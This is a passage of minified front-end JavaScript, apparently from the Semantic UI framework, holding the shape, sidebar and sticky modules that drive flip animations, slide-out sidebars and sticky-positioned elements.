                                else { h.debug("Flipping right", f); var e = h.get.transform.right();
                                    h.set.stageSize(), h.stage.right(), h.animate(e) } }, over: function() { if (h.is.complete() && !h.is.animating() && !b.allowRepeats) return void h.debug("Side already visible", f);
                                h.is.animating() ? h.queue("flip over") : (h.debug("Flipping over", f), h.set.stageSize(), h.stage.behind(), h.animate(h.get.transform.over())) }, back: function() { if (h.is.complete() && !h.is.animating() && !b.allowRepeats) return void h.debug("Side already visible", f);
                                h.is.animating() ? h.queue("flip back") : (h.debug("Flipping back", f), h.set.stageSize(), h.stage.behind(), h.animate(h.get.transform.back())) } }, get: { transform: { up: function() { var e = { y: -(t.outerHeight(!0) - f.outerHeight(!0)) / 2, z: -t.outerHeight(!0) / 2 }; return { transform: "translateY(" + e.y + "px) translateZ(" + e.z + "px) rotateX(-90deg)" } }, down: function() { var e = { y: -(t.outerHeight(!0) - f.outerHeight(!0)) / 2, z: -t.outerHeight(!0) / 2 }; return { transform: "translateY(" + e.y + "px) translateZ(" + e.z + "px) rotateX(90deg)" } }, left: function() { var e = { x: -(t.outerWidth(!0) - f.outerWidth(!0)) / 2, z: -t.outerWidth(!0) / 2 }; return { transform: "translateX(" + e.x + "px) translateZ(" + e.z + "px) rotateY(90deg)" } }, right: function() { var e = { x: -(t.outerWidth(!0) - f.outerWidth(!0)) / 2, z: -t.outerWidth(!0) / 2 }; return { transform: "translateX(" + e.x + "px) translateZ(" + e.z + "px) rotateY(-90deg)" } }, over: function() { return { transform: "translateX(" + { x: -(t.outerWidth(!0) - f.outerWidth(!0)) / 2 }.x + "px) rotateY(180deg)" } }, back: function() { return { transform: "translateX(" + { x: -(t.outerWidth(!0) - f.outerWidth(!0)) / 2 }.x + "px) rotateY(-180deg)" } } }, transitionEvent: function() { var e, t = n.createElement("element"),
                                    i = { transition: "transitionend", OTransition: "oTransitionEnd", MozTransition: "transitionend", WebkitTransition: "webkitTransitionEnd" }; for (e in i)
                                    if (void 0 !== t.style[e]) return i[e] }, nextSide: function() { return t.next(g.side).length > 0 ? t.next(g.side) : S.find(g.side).first() } }, stage: { above: function() { var e = { origin: (t.outerHeight(!0) - f.outerHeight(!0)) / 2, depth: { active: f.outerHeight(!0) / 2, next: t.outerHeight(!0) / 2 } };
                                h.verbose("Setting the initial animation position as above", f, e), _.css({ transform: "translateZ(-" + e.depth.active + "px)" }), t.css({ transform: "rotateY(0deg) translateZ(" + e.depth.active + "px)" }), f.addClass(y.animating).css({ top: e.origin + "px", transform: "rotateX(90deg) translateZ(" + e.depth.next + "px)" }) }, below: function() { var e = { origin: (t.outerHeight(!0) - f.outerHeight(!0)) / 2, depth: { active: f.outerHeight(!0) / 2, next: t.outerHeight(!0) / 2 } };
                                h.verbose("Setting the initial animation position as below", f, e), _.css({ transform: "translateZ(-" + e.depth.active + "px)" }), t.css({ transform: "rotateY(0deg) translateZ(" + e.depth.active + "px)" }), f.addClass(y.animating).css({ top: e.origin + "px", transform: "rotateX(-90deg) translateZ(" + e.depth.next + "px)" }) }, left: function() { var e = { active: t.outerWidth(!0), next: f.outerWidth(!0) },
                                    n = { origin: (e.active - e.next) / 2, depth: { active: e.next / 2, next: e.active / 2 } };
                                h.verbose("Setting the initial animation position as left", f, n), _.css({ transform: "translateZ(-" + n.depth.active + "px)" }), t.css({ transform: "rotateY(0deg) translateZ(" + n.depth.active + "px)" }), f.addClass(y.animating).css({ left: n.origin + "px", transform: "rotateY(-90deg) translateZ(" + n.depth.next + "px)" }) }, right: function() { var e = { active: t.outerWidth(!0), next: f.outerWidth(!0) },
                                    n = { origin: (e.active - e.next) / 2, depth: { active: e.next / 2, next: e.active / 2 } };
                                h.verbose("Setting the initial animation position as left", f, n), _.css({ transform: "translateZ(-" + n.depth.active + "px)" }), t.css({ transform: "rotateY(0deg) translateZ(" + n.depth.active + "px)" }), f.addClass(y.animating).css({ left: n.origin + "px", transform: "rotateY(90deg) translateZ(" + n.depth.next + "px)" }) }, behind: function() { var e = { active: t.outerWidth(!0), next: f.outerWidth(!0) },
                                    n = { origin: (e.active - e.next) / 2, depth: { active: e.next / 2, next: e.active / 2 } };
                                h.verbose("Setting the initial animation position as behind", f, n), t.css({ transform: "rotateY(0deg)" }), f.addClass(y.animating).css({ left: n.origin + "px", transform: "rotateY(-180deg)" }) } }, setting: function(t, n) { if (h.debug("Changing setting", t, n), e.isPlainObject(t)) e.extend(!0, b, t);
                            else { if (void 0 === n) return b[t];
                                e.isPlainObject(b[t]) ? e.extend(!0, b[t], n) : b[t] = n } }, internal: function(t, n) { if (e.isPlainObject(t)) e.extend(!0, h, t);
                            else { if (void 0 === n) return h[t];
                                h[t] = n } }, debug: function() {!b.silent && b.debug && (b.performance ? h.performance.log(arguments) : (h.debug = Function.prototype.bind.call(console.info, console, b.name + ":"), h.debug.apply(console, arguments))) }, verbose: function() {!b.silent && b.verbose && b.debug && (b.performance ? h.performance.log(arguments) : (h.verbose = Function.prototype.bind.call(console.info, console, b.name + ":"), h.verbose.apply(console, arguments))) }, error: function() { b.silent || (h.error = Function.prototype.bind.call(console.error, console, b.name + ":"), h.error.apply(console, arguments)) }, performance: { log: function(e) { var t, n, i;
                                b.performance && (t = (new Date).getTime(), i = a || t, n = t - i, a = t, s.push({ Name: e[0], Arguments: [].slice.call(e, 1) || "", Element: A, "Execution Time": n })), clearTimeout(h.performance.timer), h.performance.timer = setTimeout(h.performance.display, 500) }, display: function() { var t = b.name + ":",
                                    n = 0;
                                a = !1, clearTimeout(h.performance.timer), e.each(s, function(e, t) { n += t["Execution Time"] }), t += " " + n + "ms", p && (t += " '" + p + "'"), o.length > 1 && (t += " (" + o.length + ")"), (void 0 !== console.group || void 0 !== console.table) && s.length > 0 && (console.groupCollapsed(t), console.table ? console.table(s) : e.each(s, function(e, t) { console.log(t.Name + ": " + t["Execution Time"] + "ms") }), console.groupEnd()), s = [] } }, invoke: function(t, n, i) { var o, a, s, c = E; return n = n || l, i = A || i, "string" == typeof t && void 0 !== c && (t = t.split(/[\. ]/), o = t.length - 1, e.each(t, function(n, i) { var r = n != o ? i + t[n + 1].charAt(0).toUpperCase() + t[n + 1].slice(1) : t; if (e.isPlainObject(c[r]) && n != o) c = c[r];
                                else { if (void 0 !== c[r]) return a = c[r], !1; if (!e.isPlainObject(c[i]) || n == o) return void 0 !== c[i] && (a = c[i], !1);
                                    c = c[i] } })), e.isFunction(a) ? s = a.apply(i, n) : void 0 !== a && (s = a), e.isArray(r) ? r.push(s) : void 0 !== r ? r = [r, s] : void 0 !== s && (r = s), a } }, u ? (void 0 === E && h.initialize(), h.invoke(c)) : (void 0 !== E && E.invoke("destroy"), h.initialize()) }), void 0 !== r ? r : this }, e.fn.shape.settings = { name: "Shape", silent: !1, debug: !1, verbose: !1, jitter: 0, performance: !0, namespace: "shape", width: "initial", height: "initial", beforeChange: function() {}, onChange: function() {}, allowRepeats: !1, duration: !1, error: { side: "You tried to switch to a side that does not exist.", method: "The method you called is not defined" }, className: { animating: "animating", hidden: "hidden", loading: "loading", active: "active" }, selector: { sides: ".sides", side: ".side" } } }(e, window, document),
        function(e, t, n, i) { "use strict";
            t = void 0 !== t && t.Math == Math ? t : "undefined" != typeof self && self.Math == Math ? self : Function("return this")(), e.fn.sidebar = function(i) { var r, o = e(this),
                    a = e(t),
                    s = e(n),
                    c = e("html"),
                    u = e("head"),
                    l = o.selector || "",
                    d = (new Date).getTime(),
                    f = [],
                    h = arguments[0],
                    p = "string" == typeof h,
                    b = [].slice.call(arguments, 1),
                    m = t.requestAnimationFrame || t.mozRequestAnimationFrame || t.webkitRequestAnimationFrame || t.msRequestAnimationFrame || function(e) { setTimeout(e, 0) }; return o.each(function() { var o, g, v, y, w, x, S = e.isPlainObject(i) ? e.extend(!0, {}, e.fn.sidebar.settings, i) : e.extend({}, e.fn.sidebar.settings),
                        _ = S.selector,
                        k = S.className,
                        C = S.namespace,
                        A = S.regExp,
                        E = S.error,
                        T = "." + C,
                        M = "module-" + C,
                        R = e(this),
                        P = e(S.context),
                        I = R.children(_.sidebar),
                        D = P.children(_.fixed),
                        O = P.children(_.pusher),
                        j = this,
                        q = R.data(M);
                    x = { initialize: function() { x.debug("Initializing sidebar", i), x.create.id(), w = x.get.transitionEvent(), S.delaySetup ? m(x.setup.layout) : x.setup.layout(), m(function() { x.setup.cache() }), x.instantiate() }, instantiate: function() { x.verbose("Storing instance of module", x), q = x, R.data(M, x) }, create: { id: function() { v = (Math.random().toString(16) + "000000000").substr(2, 8), g = "." + v, x.verbose("Creating unique id for element", v) } }, destroy: function() { x.verbose("Destroying previous module for", R), R.off(T).removeData(M), x.is.ios() && x.remove.ios(), P.off(g), a.off(g), s.off(g) }, event: { clickaway: function(e) { var t = O.find(e.target).length > 0 || O.is(e.target),
                                    n = P.is(e.target);
                                t && (x.verbose("User clicked on dimmed page"), x.hide()), n && (x.verbose("User clicked on dimmable context (scaled out page)"), x.hide()) }, touch: function(e) {}, containScroll: function(e) { j.scrollTop <= 0 && (j.scrollTop = 1), j.scrollTop + j.offsetHeight >= j.scrollHeight && (j.scrollTop = j.scrollHeight - j.offsetHeight - 1) }, scroll: function(t) { 0 === e(t.target).closest(_.sidebar).length && t.preventDefault() } }, bind: { clickaway: function() { x.verbose("Adding clickaway events to context", P), S.closable && P.on("click" + g, x.event.clickaway).on("touchend" + g, x.event.clickaway) }, scrollLock: function() { S.scrollLock && (x.debug("Disabling page scroll"), a.on("DOMMouseScroll" + g, x.event.scroll)), x.verbose("Adding events to contain sidebar scroll"), s.on("touchmove" + g, x.event.touch), R.on("scroll" + T, x.event.containScroll) } }, unbind: { clickaway: function() { x.verbose("Removing clickaway events from context", P), P.off(g) }, scrollLock: function() { x.verbose("Removing scroll lock from page"), s.off(g), a.off(g), R.off("scroll" + T) } }, add: { inlineCSS: function() { var t, n = x.cache.width || R.outerWidth(),
                                    i = x.cache.height || R.outerHeight(),
                                    r = x.is.rtl(),
                                    a = x.get.direction(),
                                    s = { left: n, right: -n, top: i, bottom: -i };
                                r && (x.verbose("RTL detected, flipping widths"), s.left = -n, s.right = n), t = "<style>", "left" === a || "right" === a ? (x.debug("Adding CSS rules for animation distance", n), t += " .ui.visible." + a + ".sidebar ~ .fixed, .ui.visible." + a + ".sidebar ~ .pusher {   -webkit-transform: translate3d(" + s[a] + "px, 0, 0);           transform: translate3d(" + s[a] + "px, 0, 0); }") : "top" !== a && "bottom" != a || (t += " .ui.visible." + a + ".sidebar ~ .fixed, .ui.visible." + a + ".sidebar ~ .pusher {   -webkit-transform: translate3d(0, " + s[a] + "px, 0);           transform: translate3d(0, " + s[a] + "px, 0); }"), x.is.ie() && ("left" === a || "right" === a ? (x.debug("Adding CSS rules for animation distance", n), t += " body.pushable > .ui.visible." + a + ".sidebar ~ .pusher:after {   -webkit-transform: translate3d(" + s[a] + "px, 0, 0);           transform: translate3d(" + s[a] + "px, 0, 0); }") : "top" !== a && "bottom" != a || (t += " body.pushable > .ui.visible." + a + ".sidebar ~ .pusher:after {   -webkit-transform: translate3d(0, " + s[a] + "px, 0);           transform: translate3d(0, " + s[a] + "px, 0); }"), t += " body.pushable > .ui.visible.left.sidebar ~ .ui.visible.right.sidebar ~ .pusher:after, body.pushable > .ui.visible.right.sidebar ~ .ui.visible.left.sidebar ~ .pusher:after {   -webkit-transform: translate3d(0px, 0, 0);           transform: translate3d(0px, 0, 0); }"), t += "</style>", o = e(t).appendTo(u), x.debug("Adding sizing css to head", o) } }, refresh: function() { x.verbose("Refreshing selector cache"), P = e(S.context), I = P.children(_.sidebar), O = P.children(_.pusher), D = P.children(_.fixed), x.clear.cache() }, refreshSidebars: function() { x.verbose("Refreshing other sidebars"), I = P.children(_.sidebar) }, repaint: function() { x.verbose("Forcing repaint event"), j.style.display = "none";
                            j.offsetHeight;
                            j.scrollTop = j.scrollTop, j.style.display = "" }, setup: { cache: function() { x.cache = { width: R.outerWidth(), height: R.outerHeight(), rtl: "rtl" == R.css("direction") } }, layout: function() { 0 === P.children(_.pusher).length && (x.debug("Adding wrapper element for sidebar"), x.error(E.pusher), O = e('<div class="pusher" />'), P.children().not(_.omitted).not(I).wrapAll(O), x.refresh()), 0 !== R.nextAll(_.pusher).length && R.nextAll(_.pusher)[0] === O[0] || (x.debug("Moved sidebar to correct parent element"), x.error(E.movedSidebar, j), R.detach().prependTo(P), x.refresh()), x.clear.cache(), x.set.pushable(), x.set.direction() } }, attachEvents: function(t, n) { var i = e(t);
                            n = e.isFunction(x[n]) ? x[n] : x.toggle, i.length > 0 ? (x.debug("Attaching sidebar events to element", t, n), i.on("click" + T, n)) : x.error(E.notFound, t) }, show: function(t) { if (t = e.isFunction(t) ? t : function() {}, x.is.hidden()) { if (x.refreshSidebars(), S.overlay && (x.error(E.overlay), S.transition = "overlay"), x.refresh(), x.othersActive())
                                    if (x.debug("Other sidebars currently visible"), S.exclusive) { if ("overlay" != S.transition) return void x.hideOthers(x.show);
                                        x.hideOthers() } else S.transition = "overlay";
                                x.pushPage(function() { t.call(j), S.onShow.call(j) }), S.onChange.call(j), S.onVisible.call(j) } else x.debug("Sidebar is already visible") }, hide: function(t) { t = e.isFunction(t) ? t : function() {}, (x.is.visible() || x.is.animating()) && (x.debug("Hiding sidebar", t), x.refreshSidebars(), x.pullPage(function() { t.call(j), S.onHidden.call(j) }), S.onChange.call(j), S.onHide.call(j)) }, othersAnimating: function() { return I.not(R).filter("." + k.animating).length > 0 }, othersVisible: function() { return I.not(R).filter("." + k.visible).length > 0 }, othersActive: function() { return x.othersVisible() || x.othersAnimating() }, hideOthers: function(e) { var t = I.not(R).filter("." + k.visible),
                                n = t.length,
                                i = 0;
                            e = e || function() {}, t.sidebar("hide", function() {++i == n && e() }) }, toggle: function() { x.verbose("Determining toggled direction"), x.is.hidden() ? x.show() : x.hide() }, pushPage: function(t) { var n, i, r, o = x.get.transition(),
                                a = "overlay" === o || x.othersActive() ? R : O;
                            t = e.isFunction(t) ? t : function() {}, "scale down" == S.transition && x.scrollToTop(), x.set.transition(o), x.repaint(), n = function() { x.bind.clickaway(), x.add.inlineCSS(), x.set.animating(), x.set.visible() }, i = function() { x.set.dimmed() }, r = function(e) { e.target == a[0] && (a.off(w + g, r), x.remove.animating(), x.bind.scrollLock(), t.call(j)) }, a.off(w + g), a.on(w + g, r), m(n), S.dimPage && !x.othersVisible() && m(i) }, pullPage: function(t) { var n, i, r = x.get.transition(),
                                o = "overlay" == r || x.othersActive() ? R : O;
                            t = e.isFunction(t) ? t : function() {}, x.verbose("Removing context push state", x.get.direction()), x.unbind.clickaway(), x.unbind.scrollLock(), n = function() { x.set.transition(r), x.set.animating(), x.remove.visible(), S.dimPage && !x.othersVisible() && O.removeClass(k.dimmed) }, i = function(e) { e.target == o[0] && (o.off(w + g, i), x.remove.animating(), x.remove.transition(), x.remove.inlineCSS(), ("scale down" == r || S.returnScroll && x.is.mobile()) && x.scrollBack(), t.call(j)) }, o.off(w + g), o.on(w + g, i), m(n) }, scrollToTop: function() { x.verbose("Scrolling to top of page to avoid animation issues"), y = e(t).scrollTop(), R.scrollTop(0), t.scrollTo(0, 0) }, scrollBack: function() { x.verbose("Scrolling back to original page position"), t.scrollTo(0, y) }, clear: { cache: function() { x.verbose("Clearing cached dimensions"), x.cache = {} } }, set: { ios: function() { c.addClass(k.ios) }, pushed: function() { P.addClass(k.pushed) }, pushable: function() { P.addClass(k.pushable) }, dimmed: function() { O.addClass(k.dimmed) }, active: function() { R.addClass(k.active) }, animating: function() { R.addClass(k.animating) }, transition: function(e) { e = e || x.get.transition(), R.addClass(e) }, direction: function(e) { e = e || x.get.direction(), R.addClass(k[e]) }, visible: function() { R.addClass(k.visible) }, overlay: function() { R.addClass(k.overlay) } }, remove: { inlineCSS: function() { x.debug("Removing inline css styles", o), o && o.length > 0 && o.remove() }, ios: function() { c.removeClass(k.ios) }, pushed: function() { P.removeClass(k.pushed) }, pushable: function() { P.removeClass(k.pushable) }, active: function() { R.removeClass(k.active) }, animating: function() { R.removeClass(k.animating) }, transition: function(e) { e = e || x.get.transition(), R.removeClass(e) }, direction: function(e) { e = e || x.get.direction(), R.removeClass(k[e]) }, visible: function() { R.removeClass(k.visible) }, overlay: function() { R.removeClass(k.overlay) } }, get: { direction: function() { return R.hasClass(k.top) ? k.top : R.hasClass(k.right) ? k.right : R.hasClass(k.bottom) ? k.bottom : k.left }, transition: function() { var e, t = x.get.direction(); return e = x.is.mobile() ? "auto" == S.mobileTransition ? S.defaultTransition.mobile[t] : S.mobileTransition : "auto" == S.transition ? S.defaultTransition.computer[t] : S.transition, x.verbose("Determined transition", e), e }, transitionEvent: function() { var e, t = n.createElement("element"),
                                    i = { transition: "transitionend", OTransition: "oTransitionEnd", MozTransition: "transitionend", WebkitTransition: "webkitTransitionEnd" }; for (e in i)
                                    if (void 0 !== t.style[e]) return i[e] } }, is: { ie: function() { var e = !t.ActiveXObject && "ActiveXObject" in t,
                                    n = "ActiveXObject" in t; return e || n }, ios: function() { var e = navigator.userAgent,
                                    t = e.match(A.ios),
                                    n = e.match(A.mobileChrome); return !(!t || n) && (x.verbose("Browser was found to be iOS", e), !0) }, mobile: function() { var e = navigator.userAgent; return e.match(A.mobile) ? (x.verbose("Browser was found to be mobile", e), !0) : (x.verbose("Browser is not mobile, using regular transition", e), !1) }, hidden: function() { return !x.is.visible() }, visible: function() { return R.hasClass(k.visible) }, open: function() { return x.is.visible() }, closed: function() { return x.is.hidden() }, vertical: function() { return R.hasClass(k.top) }, animating: function() { return P.hasClass(k.animating) }, rtl: function() { return void 0 === x.cache.rtl && (x.cache.rtl = "rtl" == R.css("direction")), x.cache.rtl } }, setting: function(t, n) { if (x.debug("Changing setting", t, n), e.isPlainObject(t)) e.extend(!0, S, t);
                            else { if (void 0 === n) return S[t];
                                e.isPlainObject(S[t]) ? e.extend(!0, S[t], n) : S[t] = n } }, internal: function(t, n) { if (e.isPlainObject(t)) e.extend(!0, x, t);
                            else { if (void 0 === n) return x[t];
                                x[t] = n } }, debug: function() {!S.silent && S.debug && (S.performance ? x.performance.log(arguments) : (x.debug = Function.prototype.bind.call(console.info, console, S.name + ":"), x.debug.apply(console, arguments))) }, verbose: function() {!S.silent && S.verbose && S.debug && (S.performance ? x.performance.log(arguments) : (x.verbose = Function.prototype.bind.call(console.info, console, S.name + ":"), x.verbose.apply(console, arguments))) }, error: function() { S.silent || (x.error = Function.prototype.bind.call(console.error, console, S.name + ":"), x.error.apply(console, arguments)) }, performance: { log: function(e) { var t, n, i;
                                S.performance && (t = (new Date).getTime(), i = d || t, n = t - i, d = t, f.push({ Name: e[0], Arguments: [].slice.call(e, 1) || "", Element: j, "Execution Time": n })), clearTimeout(x.performance.timer), x.performance.timer = setTimeout(x.performance.display, 500) }, display: function() { var t = S.name + ":",
                                    n = 0;
                                d = !1, clearTimeout(x.performance.timer), e.each(f, function(e, t) { n += t["Execution Time"] }), t += " " + n + "ms", l && (t += " '" + l + "'"), (void 0 !== console.group || void 0 !== console.table) && f.length > 0 && (console.groupCollapsed(t), console.table ? console.table(f) : e.each(f, function(e, t) { console.log(t.Name + ": " + t["Execution Time"] + "ms") }), console.groupEnd()), f = [] } }, invoke: function(t, n, i) { var o, a, s, c = q; return n = n || b, i = j || i, "string" == typeof t && void 0 !== c && (t = t.split(/[\. ]/), o = t.length - 1, e.each(t, function(n, i) { var r = n != o ? i + t[n + 1].charAt(0).toUpperCase() + t[n + 1].slice(1) : t; if (e.isPlainObject(c[r]) && n != o) c = c[r];
                                else { if (void 0 !== c[r]) return a = c[r], !1; if (!e.isPlainObject(c[i]) || n == o) return void 0 !== c[i] ? (a = c[i], !1) : (x.error(E.method, t), !1);
                                    c = c[i] } })), e.isFunction(a) ? s = a.apply(i, n) : void 0 !== a && (s = a), e.isArray(r) ? r.push(s) : void 0 !== r ? r = [r, s] : void 0 !== s && (r = s), a } }, p ? (void 0 === q && x.initialize(), x.invoke(h)) : (void 0 !== q && x.invoke("destroy"), x.initialize()) }), void 0 !== r ? r : this }, e.fn.sidebar.settings = { name: "Sidebar", namespace: "sidebar", silent: !1, debug: !1, verbose: !1, performance: !0, transition: "auto", mobileTransition: "auto", defaultTransition: { computer: { left: "uncover", right: "uncover", top: "overlay", bottom: "overlay" }, mobile: { left: "uncover", right: "uncover", top: "overlay", bottom: "overlay" } }, context: "body", exclusive: !1, closable: !0, dimPage: !0, scrollLock: !1, returnScroll: !1, delaySetup: !1, duration: 500, onChange: function() {}, onShow: function() {}, onHide: function() {}, onHidden: function() {}, onVisible: function() {}, className: { active: "active", animating: "animating", dimmed: "dimmed", ios: "ios", pushable: "pushable", pushed: "pushed", right: "right", top: "top", left: "left", bottom: "bottom", visible: "visible" }, selector: { fixed: ".fixed", omitted: "script, link, style, .ui.modal, .ui.dimmer, .ui.nag, .ui.fixed", pusher: ".pusher", sidebar: ".ui.sidebar" }, regExp: { ios: /(iPad|iPhone|iPod)/g, mobileChrome: /(CriOS)/g, mobile: /Mobile|iP(hone|od|ad)|Android|BlackBerry|IEMobile|Kindle|NetFront|Silk-Accelerated|(hpw|web)OS|Fennec|Minimo|Opera M(obi|ini)|Blazer|Dolfin|Dolphin|Skyfire|Zune/g }, error: { method: "The method you called is not defined.", pusher: "Had to add pusher element. For optimal performance make sure body content is inside a pusher element", movedSidebar: "Had to move sidebar. For optimal performance make sure sidebar and pusher are direct children of your body tag", overlay: "The overlay setting is no longer supported, use animation: overlay", notFound: "There were no elements that matched the specified selector" } } }(e, window, document),
        function(e, t, n, i) { "use strict";
            t = void 0 !== t && t.Math == Math ? t : "undefined" != typeof self && self.Math == Math ? self : Function("return this")(), e.fn.sticky = function(i) { var r, o = e(this),
                    a = o.selector || "",
                    s = (new Date).getTime(),
                    c = [],
                    u = arguments[0],
                    l = "string" == typeof u,
                    d = [].slice.call(arguments, 1); return o.each(function() { var o, f, h, p, b, m = e.isPlainObject(i) ? e.extend(!0, {}, e.fn.sticky.settings, i) : e.extend({}, e.fn.sticky.settings),
                        g = m.className,
                        v = m.namespace,
                        y = m.error,
                        w = "." + v,
                        x = "module-" + v,
                        S = e(this),
                        _ = e(t),
                        k = e(m.scrollContext),
                        C = (S.selector, S.data(x)),
                        A = t.requestAnimationFrame || t.mozRequestAnimationFrame || t.webkitRequestAnimationFrame || t.msRequestAnimationFrame || function(e) { setTimeout(e, 0) },
                        E = this;
                    b = { initialize: function() { b.determineContainer(), b.determineContext(), b.verbose("Initializing sticky", m, o), b.save.positions(), b.checkErrors(), b.bind.events(), m.observeChanges && b.observeChanges(), b.instantiate() }, instantiate: function() { b.verbose("Storing instance of module", b), C = b, S.data(x, b) }, destroy: function() { b.verbose("Destroying previous instance"), b.reset(), h && h.disconnect(), p && p.disconnect(), _.off("load" + w, b.event.load).off("resize" + w, b.event.resize), k.off("scrollchange" + w, b.event.scrollchange), S.removeData(x) }, observeChanges: function() { "MutationObserver" in t && (h = new MutationObserver(b.event.documentChanged), p = new MutationObserver(b.event.changed), h.observe(n, { childList: !0, subtree: !0 }), p.observe(E, { childList: !0, subtree: !0 }), p.observe(f[0], { childList: !0, subtree: !0 }), b.debug("Setting up mutation observer", p)) }, determineContainer: function() { o = m.container ? e(m.container) : S.offsetParent() }, determineContext: function() { if (f = m.context ? e(m.context) : o, 0 === f.length) return void b.error(y.invalidContext, m.context, S) }, checkErrors: function() { if (b.is.hidden() && b.error(y.visible, S), b.cache.element.height > b.cache.context.height) return b.reset(), void b.error(y.elementSize, S) }, bind: { events: function() { _.on("load" + w, b.event.load).on("resize" + w, b.event.resize), k.off("scroll" + w).on("scroll" + w, b.event.scroll).on("scrollchange" + w, b.event.scrollchange) } }, event: { changed: function(e) { clearTimeout(b.timer), b.timer = setTimeout(function() { b.verbose("DOM tree modified, updating sticky menu", e), b.refresh() }, 100) }, documentChanged: function(t) {
                                [].forEach.call(t, function(t) { t.removedNodes && [].forEach.call(t.removedNodes, function(t) {
                                        (t == E || e(t).find(E).length > 0) && (b.debug("Element removed from DOM, tearing down events"), b.destroy()) }) }) }, load: function() { b.verbose("Page contents finished loading"), A(b.refresh) }, resize: function() { b.verbose("Window resized"), A(b.refresh) }, scroll: function() { A(function() { k.triggerHandler("scrollchange" + w, k.scrollTop()) }) }, scrollchange: function(e, t) { b.stick(t), m.onScroll.call(E) } }, refresh: function(e) { b.reset(), m.context || b.determineContext(), e && b.determineContainer(), b.save.positions(), b.stick(), m.onReposition.call(E) }, supports: { sticky: function() { var t = e("<div/>");
                                t[0]; return t.addClass(g.supported), t.css("position").match("sticky") } }, save: { lastScroll: function(e) { b.lastScroll = e }, elementScroll: function(e) { b.elementScroll = e }, positions: function() { var e = { height: k.height() },
                                    t = { margin: { top: parseInt(S.css("margin-top"), 10), bottom: parseInt(S.css("margin-bottom"), 10) }, offset: S.offset(), width: S.outerWidth(), height: S.outerHeight() },
                                    n = { offset: f.offset(), height: f.outerHeight() };
                                o.outerHeight();
                                b.is.standardScroll() || (b.debug("Non-standard scroll. Removing scroll offset from element offset"), e.top = k.scrollTop(), e.left = k.scrollLeft(), t.offset.top += e.top, n.offset.top += e.top, t.offset.left += e.left, n.offset.left += e.left), b.cache = { fits: t.height + m.offset <= e.height, sameHeight: t.height == n.height, scrollContext: { height: e.height }, element: { margin: t.margin, top: t.offset.top - t.margin.top, left: t.offset.left, width: t.width, height: t.height, bottom: t.offset.top + t.height }, context: { top: n.offset.top, height: n.height, bottom: n.offset.top + n.height } }, b.set.containerSize(), b.stick(), b.debug("Caching element positions", b.cache) } }, get: { direction: function(e) { var t = "down"; return e = e || k.scrollTop(), void 0 !== b.lastScroll && (b.lastScroll < e ? t = "down" : b.lastScroll > e && (t = "up")), t }, scrollChange: function(e) { return e = e || k.scrollTop(), b.lastScroll ? e - b.lastScroll : 0 }, currentElementScroll: function() { return b.elementScroll ? b.elementScroll : b.is.top() ? Math.abs(parseInt(S.css("top"), 10)) || 0 : Math.abs(parseInt(S.css("bottom"), 10)) || 0 }, elementScroll: function(e) { e = e || k.scrollTop(); var t = b.cache.element,
                                    n = b.cache.scrollContext,
                                    i = b.get.scrollChange(e),
                                    r = t.height - n.height + m.offset,
                                    o = b.get.currentElementScroll(),
                                    a = o + i; return o = b.cache.fits || a < 0 ? 0 : a > r ? r : a } }, remove: { lastScroll: function() { delete b.lastScroll }, elementScroll: function(e) { delete b.elementScroll }, minimumSize: function() { o.css("min-height", "") }, offset: function() { S.css("margin-top", "") } }, set: { offset: function() { b.verbose("Setting offset on element", m.offset), S.css("margin-top", m.offset) }, containerSize: function() { var e = o.get(0).tagName; "HTML" === e || "body" == e ? b.determineContainer() : Math.abs(o.outerHeight() - b.cache.context.height) > m.jitter && (b.debug("Context has padding, specifying exact height for container", b.cache.context.height), o.css({ height: b.cache.context.height })) }, minimumSize: function() { var e = b.cache.element;
                                o.css("min-height", e.height) }, scroll: function(e) { b.debug("Setting scroll on element", e), b.elementScroll != e && (b.is.top() && S.css("bottom", "").css("top", -e), b.is.bottom() && S.css("top", "").css("bottom", e)) }, size: function() { 0 !== b.cache.element.height && 0 !== b.cache.element.width && (E.style.setProperty("width", b.cache.element.width + "px", "important"), E.style.setProperty("height", b.cache.element.height + "px", "important")) } }, is: { standardScroll: function() { return k[0] == t }, top: function() { return S.hasClass(g.top) }, bottom: function() { return S.hasClass(g.bottom) }, initialPosition: function() { return !b.is.fixed() && !b.is.bound() }, hidden: function() { return !S.is(":visible") }, bound: function() { return S.hasClass(g.bound) }, fixed: function() { return S.hasClass(g.fixed) } }, stick: function(e) { var t = e || k.scrollTop(),
                                n = b.cache,
                                i = n.fits,
                                r = n.sameHeight,
                                o = n.element,
                                a = n.scrollContext,
                                s = n.context,
                                c = b.is.bottom() && m.pushing ? m.bottomOffset : m.offset,
                                e = { top: t + c, bottom: t + c + a.height },
                                u = (b.get.direction(e.top), i ? 0 : b.get.elementScroll(e.top)),
                                l = !i;
                            0 !== o.height && !r && (b.is.initialPosition() ? e.top >= s.bottom ? (b.debug("Initial element position is bottom of container"), b.bindBottom()) : e.top > o.top && (o.height + e.top - u >= s.bottom ? (b.debug("Initial element position is bottom of container"), b.bindBottom()) : (b.debug("Initial element position is fixed"), b.fixTop())) : b.is.fixed() ? b.is.top() ? e.top <= o.top ? (b.debug("Fixed element reached top of container"), b.setInitialPosition()) : o.height + e.top - u >= s.bottom ? (b.debug("Fixed element reached bottom of container"), b.bindBottom()) : l && (b.set.scroll(u), b.save.lastScroll(e.top), b.save.elementScroll(u)) : b.is.bottom() && (e.bottom - o.height <= o.top ? (b.debug("Bottom fixed rail has reached top of container"), b.setInitialPosition()) : e.bottom >= s.bottom ? (b.debug("Bottom fixed rail has reached bottom of container"), b.bindBottom()) : l && (b.set.scroll(u), b.save.lastScroll(e.top), b.save.elementScroll(u))) : b.is.bottom() && (e.top <= o.top ? (b.debug("Jumped from bottom fixed to top fixed, most likely used home/end button"), b.setInitialPosition()) : m.pushing ? b.is.bound() && e.bottom <= s.bottom && (b.debug("Fixing bottom attached element to bottom of browser."), b.fixBottom()) : b.is.bound() && e.top <= s.bottom - o.height && (b.debug("Fixing bottom attached element to top of browser."), b.fixTop()))) }, bindTop: function() { b.debug("Binding element to top of parent container"), b.remove.offset(), S.css({ left: "", top: "", marginBottom: "" }).removeClass(g.fixed).removeClass(g.bottom).addClass(g.bound).addClass(g.top), m.onTop.call(E), m.onUnstick.call(E) }, bindBottom: function() { b.debug("Binding element to bottom of parent container"), b.remove.offset(), S.css({ left: "", top: "" }).removeClass(g.fixed).removeClass(g.top).addClass(g.bound).addClass(g.bottom), m.onBottom.call(E), m.onUnstick.call(E) }, setInitialPosition: function() { b.debug("Returning to initial position"), b.unfix(), b.unbind() }, fixTop: function() { b.debug("Fixing element to top of page"), m.setSize && 